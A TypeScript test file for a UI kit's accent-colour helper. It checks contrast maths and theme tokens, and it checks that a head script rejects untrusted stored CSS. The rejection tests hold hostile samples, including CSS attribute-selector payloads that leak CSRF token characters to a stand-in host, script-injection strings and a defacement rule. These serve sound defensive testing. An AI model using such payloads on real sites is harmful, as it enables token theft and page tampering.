/**
 * Accent API (#41): the colour math against the real theme CSS. The contrast is measured with the
 * test suite's own implementation (tests/tokens/theme-css.ts) on the surfaces that the shipped
 * theme files resolve to, not on the table the helper uses, so a wrong table or wrong math fails.
 */
import { runInNewContext } from 'node:vm';
import { describe, expect, it } from 'vitest';
import {
	ACCENT_BASE_GROUND,
	ACCENT_GROUNDS,
	ACCENT_TOKENS,
	accentCss,
	accentTokens,
	applyAccent,
	clearAccent,
	createAccentScript,
	installAccent,
	removeAccent,
	type AccentOk,
	type AccentResult
} from '../../src/lib/components/accent.ts';
import { contrast, loadRules, resolveTokens, themeVariants } from '../tokens/theme-css.ts';

const rules = loadRules('src/lib/themes/index.css');
const themes = themeVariants(rules);

/** Name, hex. The cases that break naive "darken until it passes" or "pick black or white" code. */
const HARD: [string, string][] = [
	['very light pastel pink', '#ffc8e6'],
	['very light yellow', '#fffde7'],
	['saturated yellow', '#ffe600'],
	['pure yellow', '#ffff00'],
	['pure grey', '#808080'],
	['grey at the black/white crossover', '#767676'],
	['near-white', '#fefefe'],
	['white', '#ffffff'],
	['near-black', '#010101'],
	['black', '#000000'],
	['very dark blue', '#0a1a5c'],
	['dark navy', '#000033'],
	['saturated blue', '#0000ff'],
	['saturated red', '#ff0000'],
	['saturated green', '#00ff00'],
	['mid orange', '#ff8800'],
	['hot pink', '#e91e8c'],
	['short form', '#f0a'],
	['upper case', '#3F2A8C']
];

function ok(result: AccentResult): AccentOk {
	if (!result.ok) throw new Error(`${result.error.code}: ${result.error.message}`);
	return result;
}

/** Contrast checks written out independently of the helper's own `checks`. */
function assertContract(result: AccentOk, theme: string): void {
	const t = resolveTokens(rules, theme);
	const surfaces = ['--k-bg', '--k-bg-raised', '--k-bg-sunken'].map((n) => t.get(n) ?? '');
	const tok = (name: string): string => result.tokens[name] ?? '';
	const label = `${theme} ${result.accent}`;
	for (const s of surfaces) {
		expect(contrast(tok('--k-accent-mark'), s), `${label}: accent-mark on ${s}`).toBeGreaterThanOrEqual(3);
		expect(contrast(tok('--k-focus'), s), `${label}: focus on ${s}`).toBeGreaterThanOrEqual(3);
		expect(contrast(tok('--k-accent-text'), s), `${label}: accent-text on ${s}`).toBeGreaterThanOrEqual(4.5);
		expect(contrast(tok('--k-primary'), s), `${label}: primary on ${s}`).toBeGreaterThanOrEqual(4.5);
		expect(contrast(tok('--k-primary-hover'), s), `${label}: primary-hover on ${s}`).toBeGreaterThanOrEqual(4.5);
	}
	expect(contrast(tok('--k-accent-text'), tok('--k-accent-soft')), `${label}: accent-text on accent-soft`).toBeGreaterThanOrEqual(4.5);
	expect(contrast(t.get('--k-fg') ?? '', tok('--k-accent-soft')), `${label}: fg on accent-soft`).toBeGreaterThanOrEqual(4.5);
	expect(contrast(tok('--k-on-accent'), tok('--k-accent')), `${label}: on-accent`).toBeGreaterThanOrEqual(4.5);
	expect(contrast(tok('--k-on-primary'), tok('--k-primary')), `${label}: on-primary`).toBeGreaterThanOrEqual(4.5);
	expect(contrast(tok('--k-on-primary-hover'), tok('--k-primary-hover')), `${label}: on-primary-hover`).toBeGreaterThanOrEqual(4.5);
}

describe('accent table', () => {
	it('knows every theme the CSS defines, nothing else', () => {
		expect(Object.keys(ACCENT_GROUNDS).sort()).toEqual([...themes].sort());
	});
});

describe.each(themes)('accent on data-theme="%s"', (theme) => {
	it.each(HARD)('%s (%s) reaches the contract', (_name, hex) => {
		const result = ok(accentTokens(hex, { theme }));
		expect(result.guaranteed).toBe(true);
		expect(result.checks.every((c) => c.pass)).toBe(true);
		expect(Object.keys(result.tokens)).toEqual(ACCENT_TOKENS);
		assertContract(result, theme);
	});

	it('keeps the accent as the fill and normalises it', () => {
		expect(ok(accentTokens('#F0A', { theme })).tokens['--k-accent']).toBe('#ff00aa');
	});
});

describe.each(['light', 'dark'] as const)('accent for the %s scheme at once', (scheme) => {
	const variants = themes.filter((v) => ACCENT_GROUNDS[v]?.scheme === scheme);
	it.each(HARD)('%s (%s) holds on every standard theme of the scheme', (_name, hex) => {
		const result = ok(accentTokens(hex, { scheme }));
		expect(result.guaranteed).toBe(true);
		for (const theme of variants) assertContract(result, theme);
	});
});

describe('what it changes and what not', () => {
	it('leaves a colour that already passes alone and reports nothing', () => {
		// a dark blue on the light flower creme: every role is fine as given
		const result = ok(accentTokens('#1b2a7a', { theme: 'flower' }));
		expect(result.tokens['--k-primary']).toBe('#1b2a7a');
		expect(result.tokens['--k-accent-mark']).toBe('#1b2a7a');
		expect(result.tokens['--k-accent-text']).toBe('#1b2a7a');
		expect(result.tokens['--k-focus']).toBe('#1b2a7a');
		expect(result.adjustments).toEqual([]);
	});

	it('darkens a pastel on a light theme, keeps the hue and reports each moved token', () => {
		const result = ok(accentTokens('#ffc8e6', { theme: 'flower' }));
		expect(result.tokens['--k-accent']).toBe('#ffc8e6');
		const moved = result.adjustments.map((a) => a.token);
		expect(moved).toEqual(expect.arrayContaining(['--k-accent-mark', '--k-accent-text', '--k-primary', '--k-focus']));
		for (const a of result.adjustments) {
			expect(a.from).toBe('#ffc8e6');
			expect(a.to).toBe(result.tokens[a.token]);
			expect(a.to).not.toBe(a.from);
			expect(a.message).toContain(a.token);
		}
		// still pink: red is the strongest channel and green the weakest
		const m = /^#(..)(..)(..)$/.exec(result.tokens['--k-primary'] ?? '');
		const [r, g, b] = [m?.[1], m?.[2], m?.[3]].map((x) => parseInt(x ?? '0', 16));
		expect(r).toBeGreaterThan(b);
		expect(b).toBeGreaterThan(g);
	});

	it('lightens a dark accent on a dark theme', () => {
		const result = ok(accentTokens('#0a1a5c', { theme: 'pop-dark' }));
		expect(result.adjustments.map((a) => a.token)).toEqual(expect.arrayContaining(['--k-primary', '--k-accent-text', '--k-focus']));
		expect(contrast(result.tokens['--k-primary'] ?? '', '#0e100d')).toBeGreaterThanOrEqual(4.5);
		expect(result.tokens['--k-accent']).toBe('#0a1a5c');
	});

	it('picks the theme ink for text on the fill, black or white when it is not enough', () => {
		// flower: fg #2c4f38 / bg #f6f0e0; on yellow the dark green reads
		expect(ok(accentTokens('#ffe600', { theme: 'flower' })).tokens['--k-on-accent']).toBe('#2c4f38');
		// a mid grey needs the stronger of black and white, neither theme ink reaches 4.5:1 on it
		const grey = ok(accentTokens('#767676', { theme: 'code-paper' }));
		expect(['#000000', '#ffffff']).toContain(grey.tokens['--k-on-accent']);
	});

	it('moves the hover away from the page, and the other way at the end of the range', () => {
		const light = ok(accentTokens('#3f2a8c', { theme: 'pop' }));
		expect(contrast(light.tokens['--k-primary-hover'] ?? '', '#f3f4f1')).toBeGreaterThan(
			contrast(light.tokens['--k-primary'] ?? '', '#f3f4f1')
		);
		const dark = ok(accentTokens('#3f2a8c', { theme: 'pop-dark' }));
		expect(dark.tokens['--k-primary-hover']).not.toBe(dark.tokens['--k-primary']);
		const black = ok(accentTokens('#000000', { theme: 'flower' }));
		expect(black.tokens['--k-primary']).toBe('#000000');
		expect(black.tokens['--k-primary-hover']).not.toBe('#000000');
		const white = ok(accentTokens('#ffffff', { theme: 'flower-wald' }));
		expect(white.tokens['--k-primary']).toBe('#ffffff');
		expect(white.tokens['--k-primary-hover']).not.toBe('#ffffff');
	});

	it('sets only the requested roles', () => {
		expect(Object.keys(ok(accentTokens('#e91e8c', { theme: 'flower', roles: ['focus'] })).tokens)).toEqual(['--k-focus']);
		expect(Object.keys(ok(accentTokens('#e91e8c', { theme: 'flower', roles: ['primary'] })).tokens)).toEqual([
			'--k-primary',
			'--k-on-primary',
			'--k-primary-hover',
			'--k-on-primary-hover'
		]);
		expect(Object.keys(ok(accentTokens('#e91e8c', { theme: 'flower', roles: ['accent'] })).tokens)).toEqual([
			'--k-accent',
			'--k-on-accent',
			'--k-accent-soft',
			'--k-accent-mark',
			'--k-accent-text'
		]);
	});

	it('exposes the same tokens as a style attribute value', () => {
		const result = ok(accentTokens('#e91e8c', { theme: 'line' }));
		expect(result.style.split(';')).toEqual(Object.entries(result.tokens).map(([k, v]) => `${k}:${v}`));
	});

	it('falls back to the neutral ground without a theme and to a scheme for an unknown theme id', () => {
		expect(ok(accentTokens('#e91e8c')).scheme).toBe('light');
		expect(ok(accentTokens('#e91e8c', { scheme: 'dark' })).scheme).toBe('dark');
		expect(ok(accentTokens('#e91e8c', { theme: 'my-brand-dark', scheme: 'dark' })).scheme).toBe('dark');
		expect(ACCENT_BASE_GROUND.scheme).toBe('light');
	});

	it('derives the scheme of your own surfaces and never throws on an impossible ground', () => {
		const dark = ok(accentTokens('#e91e8c', { surfaces: { bg: '#101820' } }));
		expect(dark.scheme).toBe('dark');
		expect(dark.guaranteed).toBe(true);
		// mid grey everywhere: no colour reaches 4.5:1 on it in the usual direction, the result says so
		const grey = ok(accentTokens('#e91e8c', { surfaces: { bg: '#777777', raised: '#808080', sunken: '#6a6a6a' } }));
		expect(grey.ok).toBe(true);
		expect(grey.guaranteed).toBe(false);
		expect(grey.checks.some((c) => !c.pass)).toBe(true);
	});
});

describe('invalid input', () => {
	const bad: unknown[] = [
		'',
		' ',
		'red',
		'rgb(1,2,3)',
		'#12',
		'#12345',
		'#ggg',
		'#ffffff80',
		'#ffff',
		'ffffff',
		'#',
		'##fff',
		null,
		undefined,
		42,
		{},
		[],
		['#fff']
	];

	it.each(bad.map((v) => [JSON.stringify(v) ?? 'undefined', v]))('rejects %s without throwing', (_label, value) => {
		const result = accentTokens(value as string);
		expect(result.ok).toBe(false);
		if (!result.ok) {
			expect(result.error.code).toBe('invalid-color');
			expect(result.error.message.length).toBeGreaterThan(0);
		}
		const css = accentCss(value as string);
		expect(css.ok).toBe(false);
	});

	it('reports a bad theme, bad surfaces and a bad selector as typed failures', () => {
		const theme = accentTokens('#e91e8c', { theme: 'nagellacke' });
		expect(theme.ok === false && theme.error.code).toBe('unknown-theme');
		const ground = accentTokens('#e91e8c', { surfaces: { bg: 'white' } });
		expect(ground.ok === false && ground.error.code).toBe('invalid-ground');
		const raised = accentTokens('#e91e8c', { surfaces: { bg: '#fff', raised: 'nope' } });
		expect(raised.ok === false && raised.error.code).toBe('invalid-ground');
		for (const selector of [
			'',
			'</style><script>',
			'a{b:c}',
			'a;b',
			'@import',
			'a\\b',
			'a,b',
			'a\nb',
			'[a',
			'a]',
			'(a',
			'[a)',
			"a[b='c]",
			'a[b="c]'
		]) {
			const css = accentCss('#e91e8c', { selector });
			expect(css.ok === false && css.error.code, selector).toBe('invalid-selector');
		}
	});

	it('survives random strings', () => {
		let seed = 7;
		const next = (): number => (seed = (seed * 1664525 + 1013904223) % 4294967296) / 4294967296;
		const alphabet = '#0123456789abcdefABCDEFxyz ()%,-';
		for (let i = 0; i < 500; i++) {
			const len = Math.floor(next() * 10);
			const value = Array.from({ length: len }, () => alphabet[Math.floor(next() * alphabet.length)]).join('');
			expect(() => accentTokens(value)).not.toThrow();
		}
	});

	it('does not touch the DOM-less environment: install, apply and remove fail softly', () => {
		expect(typeof document).toBe('undefined');
		const installed = installAccent('#e91e8c');
		expect(installed.ok === false && installed.error.code).toBe('no-dom');
		const el = { style: { setProperty: () => undefined, removeProperty: () => '' }, closest: () => null } as unknown as Element &
			ElementCSSInlineStyle;
		const applied = applyAccent(el, '#e91e8c');
		expect(applied.ok === false && applied.error.code).toBe('no-dom');
		expect(() => {
			removeAccent();
			clearAccent(el);
		}).not.toThrow();
	});
});

describe('accentCss', () => {
	const result = accentCss('#e91e8c');
	const css = result.ok ? result.css : '';

	it('has a rule for every standard theme, with the aliases, and one without data-theme', () => {
		expect(result.ok && result.guaranteed).toBe(true);
		for (const theme of themes) expect(css, theme).toContain(`:root[data-theme='${theme}']`);
		expect(css).toContain(':root:not([data-theme])');
	});

	it('gives each theme the tokens of accentTokens for that theme', () => {
		expect(result.ok).toBe(true);
		if (!result.ok) return;
		for (const theme of themes) {
			const own = ok(accentTokens('#e91e8c', { theme }));
			expect(result.themes[theme]?.tokens).toEqual(own.tokens);
			const rule = css.split('\n').find((line) => line.includes(`:root[data-theme='${theme}']`)) ?? '';
			expect(rule.endsWith(`{${own.style}}`), theme).toBe(true);
		}
	});

	it('shares one rule between themes with equal tokens (aliases) and stays small', () => {
		const lines = css.split('\n');
		expect(lines.length).toBeLessThan(themes.length);
		const code = lines.find((l) => l.includes("[data-theme='code']")) ?? '';
		expect(code).toContain("[data-theme='stuffcloud']");
		expect(css.length).toBeLessThan(6000);
	});

	it('scopes to your selector and honours roles', () => {
		const scoped = accentCss('#e91e8c', { selector: '.brand', roles: ['focus'] });
		expect(scoped.ok && scoped.css).toContain(".brand[data-theme='flower']");
		expect(scoped.ok && scoped.css).not.toContain(':root');
		expect(scoped.ok && scoped.css).not.toContain('--k-primary');
	});

	it('only ever contains characters that the head script accepts', () => {
		expect(css).toMatch(/^[\w\s.#:;,%'"()[\]{}=>*^$|~+-]+$/);
	});
});

describe('createAccentScript', () => {
	const css = accentCss('#e91e8c');
	const stylesheet = css.ok ? css.css : '';

	/** Runs the script against a stub document and storage; returns the style elements it added. */
	function run(stored: string | null, key = 'k-accent'): { id: string; text: string }[] {
		const added: { id: string; text: string }[] = [];
		const document = {
			createElement: () => ({ id: '', textContent: '' }),
			head: { appendChild: (el: { id: string; textContent: string }) => added.push({ id: el.id, text: el.textContent }) }
		};
		const localStorage = { getItem: (k: string) => (k === key ? stored : null) };
		runInNewContext(createAccentScript(key), { document, localStorage });
		return added;
	}

	it('adds the stored stylesheet', () => {
		expect(run(stylesheet)).toEqual([{ id: 'kern-accent', text: stylesheet }]);
	});

	it('ignores nothing stored, foreign content and oversized values', () => {
		expect(run(null)).toEqual([]);
		expect(run('')).toEqual([]);
		expect(run('</style><script>alert(1)</script>')).toEqual([]);
		expect(run('a{background:url(https://x/y)}')).toEqual([]);
		expect(run('@import "x";')).toEqual([]);
		expect(run('a{b:c}/* x */')).toEqual([]);
		expect(run('a{b:c}'.repeat(5000))).toEqual([]);
	});

	it('survives blocked storage and a hostile key', () => {
		const document = { createElement: () => ({}), head: { appendChild: () => undefined } };
		const localStorage = {
			getItem: () => {
				throw new Error('blocked');
			}
		};
		expect(() => runInNewContext(createAccentScript('k'), { document, localStorage })).not.toThrow();
		expect(createAccentScript('</script><script>x')).not.toContain('</script>');
		expect(createAccentScript('a"b')).toContain('"a\\"b"');
	});
});

describe('the head script takes nothing but what accentCss writes', () => {
	const real = accentCss('#e91e8c');
	const stylesheet = real.ok ? real.css : '';

	function accepted(stored: string): boolean {
		const added: unknown[] = [];
		const document = {
			createElement: () => ({ id: '', textContent: '' }),
			head: { appendChild: (el: unknown) => added.push(el) }
		};
		runInNewContext(createAccentScript('k'), { document, localStorage: { getItem: () => stored } });
		return added.length === 1;
	}

	it('accepts real output: the default, a scoped selector and a role subset', () => {
		expect(accepted(stylesheet)).toBe(true);
		const scoped = accentCss('#00aa55', { selector: '.brand [data-x="y"]', roles: ['primary'] });
		expect(scoped.ok && accepted(scoped.css)).toBe(true);
		const focus = accentCss('#fff', { roles: ['focus', 'accent'] });
		expect(focus.ok && accepted(focus.css)).toBe(true);
	});

	it.each([
		[
			'attribute selector with image-set (exfiltration)',
			`input[name=csrf][value^='a']{background-image:image-set("http:a.leak.example" 1x)}`
		],
		['has() selector with a cursor image', `:root:has(input[value^='x']) body{cursor:-webkit-image-set("http:x.leak.example" 1x),auto}`],
		['defacement with content and display', 'body::before{content:"Session abgelaufen"}*{display:none}'],
		['a valid rule followed by a foreign one', `${stylesheet}\nbody{display:none}`],
		['a foreign declaration inside a valid rule', ':root{--k-accent:#e91e8c;background:url(x)}'],
		['a token that is not an accent token', ':root{--k-bg:#000000}'],
		['a non-hex value', ':root{--k-accent:red}'],
		['a custom property with a url', ':root{--k-accent:url(http://x)}'],
		['a comment', `/* x */${stylesheet}`],
		['an at-rule', `@import 'x';${stylesheet}`],
		['a backslash escape', ':root\\{--k-accent:#e91e8c}'],
		['a newline inside the selector', ':root\n,body{--k-accent:#e91e8c}'],
		['an empty block', ':root{}'],
		['no block', ':root']
	])('rejects %s', (_label, payload) => {
		expect(accepted(payload)).toBe(false);
	});

	it('is linear on a long hostile value', () => {
		const started = Date.now();
		expect(accepted(':root{--k-accent:#e91e8c;'.repeat(700))).toBe(false);
		expect(accepted('a'.repeat(19999))).toBe(false);
		expect(accepted(`${'a'.repeat(19000)}{`)).toBe(false);
		expect(Date.now() - started).toBeLessThan(1000);
	});

	it('puts a valid nonce on the style and ignores an invalid one', () => {
		const run = (nonce: string | undefined): Record<string, string>[] => {
			const added: Record<string, string>[] = [];
			const document = {
				createElement: () => ({}) as Record<string, string>,
				head: { appendChild: (el: Record<string, string>) => added.push(el) }
			};
			runInNewContext(createAccentScript('k', { nonce }), { document, localStorage: { getItem: () => stylesheet } });
			return added;
		};
		expect(run('abc123+/=_-')[0]?.['nonce']).toBe('abc123+/=_-');
		expect(run(undefined)[0]?.['nonce']).toBeUndefined();
		expect(run('"></script><script>x')[0]?.['nonce']).toBeUndefined();
		expect(createAccentScript('k', { nonce: '</script>' })).not.toContain('nonce');
	});
});

describe('hardening against untyped callers', () => {
	const junk: unknown[] = [null, 0, 1, 'x', true, [], {}, () => 1, Symbol('s')];

	it('never throws on odd options', () => {
		for (const options of junk) {
			expect(() => accentTokens('#e91e8c', options as never)).not.toThrow();
			expect(() => accentCss('#e91e8c', options as never)).not.toThrow();
			expect(() => installAccent('#e91e8c', options as never)).not.toThrow();
			expect(() => removeAccent(options as never)).not.toThrow();
			expect(() => createAccentScript('k', options as never)).not.toThrow();
		}
		for (const value of junk) {
			expect(() => accentTokens('#e91e8c', { roles: value as never })).not.toThrow();
			expect(() => accentTokens('#e91e8c', { surfaces: value as never })).not.toThrow();
			expect(() => accentTokens('#e91e8c', { theme: value as never, scheme: value as never })).not.toThrow();
			expect(() => accentCss('#e91e8c', { selector: value as never, roles: value as never })).not.toThrow();
			expect(() => createAccentScript(value as never)).not.toThrow();
		}
	});

	it('treats a missing or odd roles value as "all roles" and null options as none', () => {
		const all = Object.keys(ok(accentTokens('#e91e8c')).tokens);
		expect(Object.keys(ok(accentTokens('#e91e8c', null as never)).tokens)).toEqual(all);
		expect(Object.keys(ok(accentTokens('#e91e8c', { roles: {} as never })).tokens)).toEqual(all);
		expect(Object.keys(ok(accentTokens('#e91e8c', { roles: 'focus' as never })).tokens)).toEqual(all);
		expect(Object.keys(ok(accentTokens('#e91e8c', { surfaces: null as never })).tokens)).toEqual(all);
		const bad = accentTokens('#e91e8c', { surfaces: 5 as never });
		expect(bad.ok === false && bad.error.code).toBe('invalid-ground');
		const el = accentCss('#e91e8c', { selector: 5 as never });
		expect(el.ok === false && el.error.code).toBe('invalid-selector');
	});

	it('does not echo raw input in error messages beyond 64 characters, and survives a hostile toString', () => {
		const long = accentTokens('x'.repeat(5000));
		expect(!long.ok && long.error.message.length).toBeLessThan(120);
		const quoted = accentTokens('"</script>');
		expect(!quoted.ok && quoted.error.message).toContain('"\\"</script>"');
		const hostile = {
			toString: () => {
				throw new Error('boom');
			}
		};
		const theme = accentTokens('#e91e8c', { theme: hostile as never });
		expect(theme.ok).toBe(true);
		const selector = accentCss('#e91e8c', { selector: hostile as never });
		expect(selector.ok === false && selector.error.code).toBe('invalid-selector');
		const unknown = accentTokens('#e91e8c', { theme: 'y'.repeat(500) });
		expect(!unknown.ok && unknown.error.message.length).toBeLessThan(160);
	});

	it('refuses a missing element and a foreign document without throwing', () => {
		const el = { closest: () => null, style: { setProperty: () => undefined, removeProperty: () => '' } };
		const g = globalThis as { document?: unknown };
		g.document = {};
		try {
			expect(() => applyAccent(null as never, '#e91e8c')).not.toThrow();
			const missing = applyAccent(null as never, '#e91e8c');
			expect(missing.ok === false && missing.error.code).toBe('invalid-element');
			const plain = applyAccent({} as never, '#e91e8c');
			expect(plain.ok === false && plain.error.code).toBe('invalid-element');
			expect(() => clearAccent(null as never)).not.toThrow();
			const doc = installAccent('#e91e8c', { document: {} as never });
			expect(doc.ok === false && doc.error.code).toBe('no-dom');
			expect(() => removeAccent({ document: 5 as never })).not.toThrow();
			expect(() => applyAccent(el as never, '#e91e8c', { computed: false, scheme: 'light' })).not.toThrow();
		} finally {
			delete g.document;
		}
	});
});
